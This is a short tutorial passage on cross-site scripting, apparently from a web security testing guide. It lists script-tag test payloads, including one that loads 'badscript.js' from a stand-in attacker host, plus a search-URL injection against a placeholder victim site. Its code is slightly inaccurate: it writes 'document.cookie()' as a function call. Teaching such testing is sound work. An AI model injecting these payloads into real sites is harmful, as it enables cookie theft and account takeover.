    # Cross-Site Scripting (CSS)


    Cross-site attacking place malicious code, usually JavaScript, in locations where
    other users see it. Target fields in forms can be addresses, bulletin board comments,
    and so on. The malicious code usually steals cookies, which would allow the attacker
    to impersonate the victim, or perform a social engineering attack, which may trick
    the victim into divulging his or her password. Hotmail and AOL have been plagued
    by this type of social engineering attack.


    One tests if whether or not an application is vulnerable to a CSS attack. This
    is not intended to be a treatise on JavaScript or over-techniques for manipulating
    browser vulnerabilities. Here are three methods that, if successful, indicate
    that an application is vulnerable:


    ```

    <script>document.cookie()</script>

    <script>alert(''Salut!'')</script>

    <script src="http://www.malicious-host.foo/badscript.js"></script>

    ```


    Notice that the last line calls JavaScript from an entirely different server.
    This technique circumvents length restrictions because the badscript.js file can
    be arbitrarily long, whereas the response is relatively short. These tests are
    simple to execute against forms. Simply type the strings in any field that is
    replayed. For example, e-commerce presents a verification page after you enter
    your name and see what happens.


    There are other ways to execute CSS attacks. As we alluded previously, an application''s
    search engine is a prime target for CSS attacks. Enter something in the search
    field, or submit it to the URL:


    ```

    http://www.victim.com/search/search.pl?query=<script>alert(''foo'')</script>

    ```


    We have found that error pages are often subject to CSS attacks. For example,
    the URL looks like:


    http://www.victim.com/inc/errors.asp?Error=Invalid%20password'
